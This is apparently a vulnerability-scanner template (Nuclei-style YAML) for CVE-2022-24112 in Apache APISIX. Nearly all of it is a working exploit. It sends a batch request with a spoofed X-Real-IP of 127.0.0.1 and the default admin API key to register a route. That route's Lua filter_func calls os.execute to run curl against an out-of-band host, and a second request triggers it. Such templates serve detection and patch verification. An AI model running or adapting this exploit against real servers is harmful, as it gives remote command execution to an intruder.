id: yaml-poc-apache-apisix-other-CVE-2022-24112
info:
  name: Yaml Poc Apache Apisix Other Cve 2022 24112
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-apache-apisix-other-CVE-2022-24112'
  tags: apache,cve
  classification:
    cve-id: CVE-2022-24112
  reference:
  - http://packetstormsecurity.com/files/166228/Apache-APISIX-Remote-Code-Execution.html
  - http://packetstormsecurity.com/files/166328/Apache-APISIX-2.12.1-Remote-Code-Execution.html
  - http://www.openwall.com/lists/oss-security/2022/02/11/3
  - https://cxsecurity.com/issue/WLB-2022030040
  - https://cxsecurity.com/issue/WLB-2022030068
http:
- method: POST
  path:
  - /apisix/batch-requests
  body: "{\n\"headers\":{\n    \"X-Real-IP\":\"127.0.0.1\",\n    \"Content-Type\"\
    :\"application/json\"\n},\n\"timeout\":1500,\n\"pipeline\":[\n    {\n    \"method\"\
    :\"PUT\",\n    \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\"\
    ,\n    \"body\":\"{\\r\\n \\\"name\\\": \\\"test\\\", \\\"method\\\": [\\\"GET\\\
    \"],\\r\\n \\\"uri\\\": \\\"/api/{{r1}}\\\",\\r\\n \\\"upstream\\\":{\\\"type\\\
    \":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\r\\n,\\r\\n\\\
    \"filter_func\\\": \\\"function(vars) os.execute('curl {{reverseDNS}}'); return\
    \ true end\\\"}\"\n    }\n]\n}\n"
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: GET
  path:
  - /api/{{r1}}
